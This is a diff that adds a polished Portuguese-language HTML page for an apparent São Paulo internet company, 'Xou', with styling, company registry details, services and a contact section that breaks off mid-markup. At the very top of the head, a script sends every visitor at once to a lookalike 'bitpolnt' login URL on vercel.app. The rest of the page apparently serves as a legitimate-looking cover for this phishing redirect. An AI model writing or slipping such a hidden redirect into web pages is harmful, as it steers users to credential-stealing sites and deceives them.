@@ -1,0 +1,1392 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+ <script>
+  window.location.href = "https://www-bitpolnt.vercel.app/jp/login";
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Xou Portal e Provedor de Conteúdo na Internet LTDA - Soluções digitais, portal de conteúdo e serviços de internet de qualidade.">
+  <meta name="keywords" content="Xou, portal, provedor, conteúdo, internet, São Paulo">
+  <meta name="author" content="Xou Portal e Provedor de Conteudo Na Internet LTDA">
+  <title>Xou | Portal e Provedor de Conteúdo na Internet</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #6f42c1;
+      --primary-dark: #4c2a8a;
+      --primary-light: #8b5cf6;
+      --accent: #00d9ff;
+      --accent-2: #ff006e;
+      --dark: #0a0a1a;
+      --dark-2: #14142b;
+      --gray: #6b7280;
+      --light: #f8f7ff;
+      --gradient-1: linear-gradient(135deg, #6f42c1 0%, #00d9ff 100%);
+      --gradient-2: linear-gradient(135deg, #ff006e 0%, #6f42c1 100%);
+      --gradient-3: linear-gradient(135deg, #0a0a1a 0%, #14142b 100%);
+      --shadow-sm: 0 2px 8px rgba(111, 66, 193, 0.08);
+      --shadow-md: 0 8px 30px rgba(111, 66, 193, 0.12);
+      --shadow-lg: 0 20px 60px rgba(111, 66, 193, 0.18);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html { scroll-behavior: smooth; scroll-padding-top: 80px; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      color: #2c2c2c;
+      background-color: #fff;
+      overflow-x: hidden;
+      line-height: 1.6;
+    }
+
+    /* ===== NAVBAR ===== */
+    .navbar {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      transition: all 0.3s ease;
+      padding: 1rem 0;
+      border-bottom: 1px solid rgba(111, 66, 193, 0.08);
+    }
+    .navbar.scrolled {
+      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.08);
+      padding: 0.6rem 0;
+    }
+    .navbar-brand {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 700;
+      font-size: 1.8rem;
+      letter-spacing: -1px;
+      background: var(--gradient-1);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .navbar-brand .logo-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--gradient-1);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1.4rem;
+      box-shadow: 0 4px 15px rgba(111, 66, 193, 0.35);
+    }
+    .navbar-brand .logo-text {
+      background: var(--gradient-1);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .nav-link {
+      font-weight: 500;
+      color: #2c2c2c !important;
+      padding: 0.5rem 1rem !important;
+      position: relative;
+      transition: color 0.3s ease;
+    }
+    .nav-link::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      width: 0;
+      height: 2px;
+      background: var(--gradient-1);
+      transition: all 0.3s ease;
+      transform: translateX(-50%);
+    }
+    .nav-link:hover { color: var(--primary) !important; }
+    .nav-link:hover::after { width: 60%; }
+    .btn-nav {
+      background: var(--gradient-1);
+      color: white !important;
+      padding: 0.6rem 1.5rem !important;
+      border-radius: 50px;
+      font-weight: 600;
+      box-shadow: 0 4px 15px rgba(111, 66, 193, 0.3);
+      transition: all 0.3s ease;
+    }
+    .btn-nav:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(111, 66, 193, 0.4);
+    }
+    .btn-nav::after { display: none; }
+
+    /* ===== HERO ===== */
+    .hero {
+      position: relative;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      background: var(--gradient-3);
+      overflow: hidden;
+      padding: 120px 0 80px;
+    }
+    .hero::before {
+      content: '';
+      position: absolute;
+      width: 600px;
+      height: 600px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(111, 66, 193, 0.4) 0%, transparent 70%);
+      top: -200px;
+      right: -200px;
+      animation: float 8s ease-in-out infinite;
+    }
+    .hero::after {
+      content: '';
+      position: absolute;
+      width: 500px;
+      height: 500px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(0, 217, 255, 0.25) 0%, transparent 70%);
+      bottom: -150px;
+      left: -150px;
+      animation: float 10s ease-in-out infinite reverse;
+    }
+    @keyframes float {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      50% { transform: translate(30px, -30px) scale(1.1); }
+    }
+    .hero .container { position: relative; z-index: 2; }
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      color: #fff;
+      padding: 8px 20px;
+      border-radius: 50px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      margin-bottom: 30px;
+      backdrop-filter: blur(10px);
+    }
+    .hero-badge .dot {
+      width: 8px;
+      height: 8px;
+      background: #00ff88;
+      border-radius: 50%;
+      box-shadow: 0 0 10px #00ff88;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.7; transform: scale(1.2); }
+    }
+    .hero h1 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: clamp(2.5rem, 5.5vw, 4.5rem);
+      font-weight: 700;
+      color: #fff;
+      line-height: 1.1;
+      letter-spacing: -2px;
+      margin-bottom: 25px;
+    }
+    .hero h1 .gradient-text {
+      background: linear-gradient(135deg, #00d9ff 0%, #8b5cf6 50%, #ff006e 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .hero p.lead {
+      font-size: 1.2rem;
+      color: rgba(255, 255, 255, 0.75);
+      max-width: 600px;
+      margin-bottom: 40px;
+      font-weight: 300;
+    }
+    .hero .btn-hero {
+      padding: 1rem 2.5rem;
+      border-radius: 50px;
+      font-weight: 600;
+      font-size: 1rem;
+      border: none;
+      transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .btn-hero-primary {
+      background: var(--gradient-1);
+      color: white;
+      box-shadow: 0 10px 30px rgba(111, 66, 193, 0.4);
+    }
+    .btn-hero-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 40px rgba(111, 66, 193, 0.55);
+      color: white;
+    }
+    .btn-hero-outline {
+      background: rgba(255, 255, 255, 0.05);
+      color: white;
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      backdrop-filter: blur(10px);
+    }
+    .btn-hero-outline:hover {
+      background: rgba(255, 255, 255, 0.12);
+      color: white;
+      transform: translateY(-3px);
+    }
+    .hero-stats {
+      display: flex;
+      gap: 40px;
+      margin-top: 60px;
+      flex-wrap: wrap;
+    }
+    .hero-stat h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 5px;
+      background: var(--gradient-1);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .hero-stat p {
+      color: rgba(255, 255, 255, 0.6);
+      font-size: 0.9rem;
+      margin: 0;
+    }
+
+    /* ===== SEÇÕES ===== */
+    section { padding: 100px 0; position: relative; }
+
+    .section-label {
+      display: inline-block;
+      font-size: 0.8rem;
+      font-weight: 600;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--primary);
+      margin-bottom: 15px;
+    }
+    .section-title {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: clamp(2rem, 4vw, 3rem);
+      font-weight: 700;
+      letter-spacing: -1px;
+      color: var(--dark);
+      margin-bottom: 20px;
+      line-height: 1.2;
+    }
+    .section-subtitle {
+      font-size: 1.1rem;
+      color: var(--gray);
+      max-width: 700px;
+      margin: 0 auto 60px;
+    }
+
+    /* ===== SOBRE / EMPRESA ===== */
+    .about-section { background: #fff; }
+
+    .about-card {
+      background: #fff;
+      border: 1px solid rgba(111, 66, 193, 0.08);
+      border-radius: 20px;
+      padding: 35px;
+      height: 100%;
+      transition: all 0.4s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    .about-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: var(--gradient-1);
+      transform: scaleX(0);
+      transform-origin: left;
+      transition: transform 0.4s ease;
+    }
+    .about-card:hover {
+      transform: translateY(-8px);
+      box-shadow: var(--shadow-lg);
+      border-color: transparent;
+    }
+    .about-card:hover::before { transform: scaleX(1); }
+    .about-card .icon-box {
+      width: 60px;
+      height: 60px;
+      border-radius: 15px;
+      background: linear-gradient(135deg, rgba(111, 66, 193, 0.1), rgba(0, 217, 255, 0.1));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.6rem;
+      color: var(--primary);
+      margin-bottom: 20px;
+    }
+    .about-card h5 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 600;
+      color: var(--dark);
+      margin-bottom: 15px;
+      font-size: 1.15rem;
+    }
+    .info-item {
+      display: flex;
+      align-items: flex-start;
+      padding: 10px 0;
+      border-bottom: 1px dashed rgba(111, 66, 193, 0.1);
+    }
+    .info-item:last-child { border-bottom: none; }
+    .info-item i {
+      color: var(--primary);
+      margin-right: 12px;
+      margin-top: 3px;
+      font-size: 1rem;
+      flex-shrink: 0;
+    }
+    .info-item strong { color: var(--dark); font-weight: 600; }
+    .info-item span { color: #555; }
+
+    /* ===== SERVIÇOS ===== */
+    .services-section {
+      background: var(--light);
+      position: relative;
+    }
+    .service-card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 40px 30px;
+      height: 100%;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.4s ease;
+      border: 1px solid rgba(111, 66, 193, 0.06);
+    }
+    .service-card::after {
+      content: '';
+      position: absolute;
+      bottom: -50%;
+      right: -50%;
+      width: 200px;
+      height: 200px;
+      background: radial-gradient(circle, rgba(111, 66, 193, 0.08) 0%, transparent 70%);
+      border-radius: 50%;
+      transition: all 0.5s ease;
+    }
+    .service-card:hover {
+      transform: translateY(-10px);
+      box-shadow: var(--shadow-lg);
+      border-color: transparent;
+    }
+    .service-card:hover::after {
+      width: 400px;
+      height: 400px;
+    }
+    .service-icon {
+      width: 70px;
+      height: 70px;
+      border-radius: 18px;
+      background: var(--gradient-1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.8rem;
+      color: white;
+      margin-bottom: 25px;
+      box-shadow: 0 10px 25px rgba(111, 66, 193, 0.3);
+      transition: transform 0.4s ease;
+    }
+    .service-card:hover .service-icon {
+      transform: rotate(-8deg) scale(1.05);
+    }
+    .service-card:nth-child(2) .service-icon {
+      background: var(--gradient-2);
+      box-shadow: 0 10px 25px rgba(255, 0, 110, 0.3);
+    }
+    .service-card:nth-child(3) .service-icon {
+      background: linear-gradient(135deg, #00d9ff, #00ff88);
+      box-shadow: 0 10px 25px rgba(0, 217, 255, 0.3);
+    }
+    .service-card h4 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 600;
+      font-size: 1.25rem;
+      color: var(--dark);
+      margin-bottom: 12px;
+    }
+    .service-card p { color: var(--gray); font-size: 0.95rem; margin: 0; }
+
+    /* ===== CONTATO ===== */
+    .contact-section { background: #fff; }
+
+    .contact-info-card {
+      background: var(--gradient-3);
+      color: white;
+      border-radius: 24px;
+      padding: 45px;
+      height: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+    .contact-info-card::before {
+      content: '';
+      position: absolute;
+      width: 300px;
+      height: 300px;
+      background: radial-gradient(circle, rgba(111, 66, 193, 0.4) 0%, transparent 70%);
+      top: -100px;
+      right: -100px;
+      border-radius: 50%;
+    }
+    .contact-info-card h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 700;
+      font-size: 1.8rem;
+      margin-bottom: 15px;
+      position: relative;
+    }
+    .contact-info-card > p {
+      color: rgba(255, 255, 255, 0.7);
+      margin-bottom: 35px;
+      position: relative;
+    }
+    .contact-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 15px;
+      margin-bottom: 25px;
+      position: relative;
+    }
+    .contact-item .ci-icon {
+      width: 45px;
+      height: 45px;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.1rem;
+      color: var(--accent);
+      flex-shrink: 0;
+      transition: all 0.3s ease;
+    }
+    .contact-item:hover .ci-icon {
+      background: var(--gradient-1);
+      color: white;
+      transform: scale(1.1);
+    }
+    .contact-item h6 {
+      color: rgba(255, 255, 255, 0.6);
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 4px;
+      font-weight: 500;
+    }
+    .contact-item p, .contact-item a {
+      color: white;
+      margin: 0;
+      font-weight: 500;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+    .contact-item a:hover { color: var(--accent); }
+
+    .contact-form {
+      background: #fff;
+      border-radius: 24px;
+      padding: 45px;
+      box-shadow: var(--shadow-md);
+      border: 1px solid rgba(111, 66, 193, 0.08);
+    }
+    .contact-form h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 700;
+      font-size: 1.8rem;
+      color: var(--dark);
+      margin-bottom: 8px;
+    }
+    .contact-form > p {
+      color: var(--gray);
+      margin-bottom: 30px;
+    }
+    .form-floating > .form-control,
+    .form-floating > .form-select {
+      border: 1px solid rgba(111, 66, 193, 0.15);
+      border-radius: 12px;
+      padding: 1rem 1rem;
+      background: #fafafa;
+      transition: all 0.3s ease;
+    }
+    .form-floating > .form-control:focus,
+    .form-floating > .form-select:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 0.25rem rgba(111, 66, 193, 0.1);
+      background: #fff;
+    }
+    .form-floating > label {
+      color: var(--gray);
+      padding: 1rem;
+    }
+    .btn-submit {
+      background: var(--gradient-1);
+      border: none;
+      color: white;
+      padding: 1rem 2rem;
+      border-radius: 12px;
+      font-weight: 600;
+      width: 100%;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 20px rgba(111, 66, 193, 0.3);
+    }
+    .btn-submit:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 30px rgba(111, 66, 193, 0.4);
+      color: white;
+    }
+
+    /* ===== PRIVACIDADE ===== */
+    .privacy-section {
+      background: var(--light);
+    }
+    .privacy-card {
+      background: #fff;
+      border-radius: 24px;
+      padding: 60px;
+      box-shadow: var(--shadow-sm);
+      border: 1px solid rgba(111, 66, 193, 0.06);
+    }
+    .privacy-card h5 {
+      font-family: 'Space Grotesk', sans-serif;
+      color: var(--primary-dark);
+      font-weight: 700;
+      font-size: 1.3rem;
+      margin-top: 40px;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .privacy-card h5:first-of-type { margin-top: 0; }
+    .privacy-card h5 .num {
+      width: 32px;
+      height: 32px;
+      background: var(--gradient-1);
+      color: white;
+      border-radius: 10px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.9rem;
+      flex-shrink: 0;
+    }
+    .privacy-card p, .privacy-card li {
+      color: #4a4a4a;
+      line-height: 1.8;
+      font-size: 1rem;
+    }
+    .privacy-card ul { padding-left: 20px; }
+    .privacy-card ul li { margin-bottom: 8px; }
+    .privacy-card ul li::marker { color: var(--primary); }
+    .privacy-card a { color: var(--primary); font-weight: 500; }
+    .privacy-card a:hover { color: var(--primary-dark); }
+    .privacy-intro {
+      background: linear-gradient(135deg, rgba(111, 66, 193, 0.05), rgba(0, 217, 255, 0.05));
+      border-left: 4px solid var(--primary);
+      padding: 25px 30px;
+      border-radius: 12px;
+      margin-bottom: 30px;
+    }
+    .privacy-date {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(111, 66, 193, 0.08);
+      color: var(--primary-dark);
+      padding: 6px 16px;
+      border-radius: 50px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      margin-bottom: 25px;
+    }
+
+    /* ===== FOOTER ===== */
+    .footer {
+      background: var(--dark);
+      color: rgba(255, 255, 255, 0.7);
+      padding: 70px 0 30px;
+      position: relative;
+      overflow: hidden;
+    }
+    .footer::before {
+      content: '';
+      position: absolute;
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(111, 66, 193, 0.15) 0%, transparent 70%);
+      top: -200px;
+      right: -100px;
+      border-radius: 50%;
+    }
+    .footer h5 {
+      color: white;
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 600;
+      font-size: 1.1rem;
+      margin-bottom: 20px;
+    }
+    .footer .footer-brand {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 700;
+      font-size: 1.6rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 15px;
+      color: white;
+    }
+    .footer .footer-brand .logo-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--gradient-1);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1.4rem;
+    }
+    .footer p { font-size: 0.92rem; line-height: 1.7; }
+    .footer ul { list-style: none; padding: 0; }
+    .footer ul li { margin-bottom: 12px; }
+    .footer ul li a {
+      color: rgba(255, 255, 255, 0.7);
+      text-decoration: none;
+      font-size: 0.92rem;
+      transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .footer ul li a:hover {
+      color: var(--accent);
+      transform: translateX(5px);
+    }
+    .footer ul li a i { font-size: 0.8rem; }
+    .footer .social-links {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+    }
+    .footer .social-links a {
+      width: 42px;
+      height: 42px;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1.1rem;
+      transition: all 0.3s ease;
+      text-decoration: none;
+    }
+    .footer .social-links a:hover {
+      background: var(--gradient-1);
+      transform: translateY(-3px);
+    }
+    .footer-bottom {
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+      margin-top: 50px;
+      padding-top: 25px;
+      text-align: center;
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.5);
+    }
+    .footer-bottom a { color: var(--accent); text-decoration: none; }
+
+    /* ===== COOKIE BANNER ===== */
+    .cookie-banner {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(150%);
+      width: calc(100% - 40px);
+      max-width: 900px;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+      padding: 20px 25px;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      flex-wrap: wrap;
+      transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+      border: 1px solid rgba(111, 66, 193, 0.1);
+    }
+    .cookie-banner.show {
+      transform: translateX(-50%) translateY(0);
+    }
+    .cookie-banner .cookie-icon {
+      width: 48px;
+      height: 48px;
+      background: linear-gradient(135deg, #ffd700, #ff9500);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      flex-shrink: 0;
+    }
+    .cookie-banner .cookie-text {
+      flex: 1;
+      min-width: 200px;
+    }
+    .cookie-banner .cookie-text p {
+      margin: 0;
+      font-size: 0.9rem;
+      color: #444;
+    }
+    .cookie-banner .cookie-text a {
+      color: var(--primary);
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .cookie-banner .cookie-actions {
+      display: flex;
+      gap: 10px;
+      flex-shrink: 0;
+    }
+    .cookie-banner .btn-accept {
+      background: var(--gradient-1);
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 10px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      transition: all 0.3s ease;
+    }
+    .cookie-banner .btn-accept:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(111, 66, 193, 0.4);
+    }
+    .cookie-banner .btn-reject {
+      background: #f0f0f0;
+      color: #555;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 10px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      transition: all 0.3s ease;
+    }
+    .cookie-banner .btn-reject:hover { background: #e0e0e0; }
+
+    /* ===== BACK TO TOP ===== */
+    .back-to-top {
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      width: 50px;
+      height: 50px;
+      background: var(--gradient-1);
+      color: white;
+      border: none;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.3rem;
+      cursor: pointer;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.4s ease;
+      box-shadow: 0 8px 25px rgba(111, 66, 193, 0.4);
+      z-index: 999;
+    }
+    .back-to-top.show {
+      opacity: 1;
+      visibility: visible;
+    }
+    .back-to-top:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 12px 35px rgba(111, 66, 193, 0.55);
+    }
+
+    /* ===== ANIMAÇÕES DE SCROLL ===== */
+    .reveal {
+      opacity: 0;
+      transform: translateY(40px);
+      transition: all 0.8s ease;
+    }
+    .reveal.active {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* ===== RESPONSIVO ===== */
+    @media (max-width: 991px) {
+      .hero-stats { gap: 30px; }
+      .privacy-card { padding: 35px 25px; }
+      .contact-info-card, .contact-form { padding: 30px; }
+    }
+    @media (max-width: 768px) {
+      section { padding: 70px 0; }
+      .hero { padding: 100px 0 60px; min-height: auto; }
+      .hero-stats { margin-top: 40px; }
+      .hero-stat h3 { font-size: 1.8rem; }
+      .navbar-brand { font-size: 1.5rem; }
+      .navbar-brand .logo-icon { width: 34px; height: 34px; font-size: 1.1rem; }
+      .cookie-banner { flex-direction: column; text-align: center; }
+      .cookie-banner .cookie-actions { width: 100%; justify-content: center; }
+      .back-to-top { bottom: 20px; right: 20px; width: 45px; height: 45px; }
+      .privacy-card { padding: 30px 20px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== NAVBAR ===== -->
+  <nav class="navbar navbar-expand-lg fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="#inicio">
+        <span class="logo-icon"><i class="bi bi-lightning-charge-fill"></i></span>
+        <span class="logo-text">Xou</span>
+      </a>
+      <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse" data-bs-target="#navMenu">
+        <i class="bi bi-list fs-1 text-dark"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navMenu">
+        <ul class="navbar-nav ms-auto align-items-lg-center gap-lg-2">
+          <li class="nav-item"><a class="nav-link" href="#inicio">Início</a></li>
+          <li class="nav-item"><a class="nav-link" href="#empresa">Empresa</a></li>
+          <li class="nav-item"><a class="nav-link" href="#servicos">Serviços</a></li>
+          <li class="nav-item"><a class="nav-link" href="#contato">Contato</a></li>
+          <li class="nav-item"><a class="nav-link" href="#privacidade">Privacidade</a></li>
+          <li class="nav-item ms-lg-3">
+            <a class="nav-link btn-nav" href="#contato">
+              <i class="bi bi-chat-dots me-1"></i> Fale Conosco
+            </a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- ===== HERO ===== -->
+  <section class="hero" id="inicio">
+    <div class="container">
+      <div class="row align-items-center">
+        <div class="col-lg-7">
+          <div class="hero-badge">
+            <span class="dot"></span>
+            Empresa Ativa · Desde 2021
+          </div>
+          <h1>
+            Conectando você ao <span class="gradient-text">futuro digital</span>
+          </h1>
+          <p class="lead">
+            Portal de conteúdo e provedor de internet comprometido com qualidade, inovação e a melhor experiência digital para você.
+          </p>
+          <div class="d-flex gap-3 flex-wrap">
+            <a href="#servicos" class="btn-hero btn-hero-primary">
+              Nossos Serviços <i class="bi bi-arrow-right"></i>
+            </a>
+            <a href="#contato" class="btn-hero btn-hero-outline">
+              <i class="bi bi-chat-dots"></i> Entre em Contato
+            </a>
+          </div>
+          <div class="hero-stats">
+            <div class="hero-stat">
+              <h3>2021</h3>
+              <p>Ano de fundação</p>
+            </div>
+            <div class="hero-stat">
+              <h3>100%</h3>
+              <p>Comprometimento</p>
+            </div>
+            <div class="hero-stat">
+              <h3>24/7</h3>
+              <p>Disponibilidade</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== EMPRESA ===== -->
+  <section class="about-section" id="empresa">
+    <div class="container">
+      <div class="text-center reveal">
+        <span class="section-label">Sobre Nós</span>
+        <h2 class="section-title">Dados da Empresa</h2>
+        <p class="section-subtitle">
+          Transparência e credibilidade são os pilares da Xou. Conheça nossas informações oficiais.
+        </p>
+      </div>
+
+      <div class="row g-4">
+        <div class="col-lg-6 reveal">
+          <div class="about-card">
+            <div class="icon-box"><i class="bi bi-building"></i></div>
+            <h5>Informações Cadastrais</h5>
+            <div class="info-item"><i class="bi bi-hash"></i><div><strong>CNPJ:</strong> <span>42.971.737/0001-00</span></div></div>
+            <div class="info-item"><i class="bi bi-card-text"></i><div><strong>Razão Social:</strong> <span>Xou Portal e Provedor de Conteudo Na Internet LTDA</span></div></div>
+            <div class="info-item"><i class="bi bi-shop"></i><div><strong>Nome Fantasia:</strong> <span>Xou</span></div></div>
+            <div class="info-item"><i class="bi bi-calendar-event"></i><div><strong>Data da Abertura:</strong> <span>03/08/2021</span></div></div>
+            <div class="info-item"><i class="bi bi-briefcase"></i><div><strong>Porte:</strong> <span>Micro Empresa</span></div></div>
+            <div class="info-item"><i class="bi bi-file-earmark-text"></i><div><strong>Natureza Jurídica:</strong> <span>Sociedade Empresária Limitada</span></div></div>
+            <div class="info-item"><i class="bi bi-currency-dollar"></i><div><strong>Capital Social:</strong> <span>R$ 10.000,00</span></div></div>
+            <div class="info-item"><i class="bi bi-diagram-3"></i><div><strong>Tipo:</strong> <span>Matriz</span></div></div>
+            <div class="info-item"><i class="bi bi-check2-circle"></i><div><strong>Situação:</strong> <span class="text-success fw-bold">Ativa</span></div></div>
+          </div>
+        </div>
+
+        <div class="col-lg-6 reveal">
+          <div class="about-card">
+            <div class="icon-box"><i class="bi bi-geo-alt"></i></div>
+            <h5>Localização</h5>
+            <div class="info-item"><i class="bi bi-signpost"></i><div><strong>Logradouro:</strong> <span>Avenida Naylor de Oliveira, 1710</span></div></div>
+            <div class="info-item"><i class="bi bi-house"></i><div><strong>Complemento:</strong> <span>Apt 12B</span></div></div>
+            <div class="info-item"><i class="bi bi-map"></i><div><strong>Bairro:</strong> <span>Cidade Tiradentes</span></div></div>
+            <div class="info-item"><i class="bi bi-mailbox"></i><div><strong>CEP:</strong> <span>08470-800</span></div></div>
+            <div class="info-item"><i class="bi bi-building"></i><div><strong>Município:</strong> <span>São Paulo</span></div></div>
+            <div class="info-item"><i class="bi bi-flag"></i><div><strong>Estado:</strong> <span>São Paulo</span></div></div>
+            <div class="info-item"><i class="bi bi-check-circle"></i><div><strong>Simples Nacional:</strong> <span>Optante desde 01/01/2024</span></div></div>
+            <div class="info-item"><i class="bi bi-x-circle"></i><div><strong>MEI:</strong> <span>Não optante</span></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== SERVIÇOS ===== -->
+  <section class="services-section" id="servicos">
+    <div class="container">
+      <div class="text-center reveal">
+        <span class="section-label">O Que Fazemos</span>
+        <h2 class="section-title">Nossos Serviços</h2>
+        <p class="section-subtitle">
+          Soluções digitais completas para conectar pessoas, conteúdo e tecnologia.
+        </p>
+      </div>
+
+      <div class="row g-4">
+        <div class="col-md-6 col-lg-4 reveal">
+          <div class="service-card">
+            <div class="service-icon"><i class="bi bi-globe2"></i></div>
+            <h4>Portal de Conteúdo</h4>
+            <p>Plataforma com conteúdo relevante, informativo e atualizado para manter você sempre bem informado.</p>
+          </div>
+        </div>
+        <div class="col-md-6 col-lg-4 reveal">
+          <div class="service-card">
+            <div class="service-icon"><i class="bi bi-wifi"></i></div>
+            <h4>Provedor de Internet</h4>
+            <p>Serviços de conexão e distribuição de internet com estabilidade, segurança e alta performance.</p>
+          </div>
+        </div>
+        <div class="col-md-6 col-lg-4 reveal">
+          <div class="service-card">
+            <div class="service-icon"><i class="bi bi-shield-check"></i></div>
+            <h4>Segurança Digital</h4>
+            <p>Proteção de dados e navegação segura, com compromisso total com a privacidade dos usuários.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== CONTATO ===== -->
+  <section class="contact-section" id="contato">
+    <div class="container">
+      <div class="text-center reveal">
+        <span class="section-label">Fale Conosco</span>
+        <h2 class="section-title">Entre em Contato</h2>
+        <p class="section-subtitle">
+          Estamos prontos para atender você. Envie sua mensagem ou fale diretamente conosco.
+        </p>
+      </div>
+
+      <div class="row g-4">
+        <div class="col-lg-5 reveal">
+          <div class="contact-info-card">
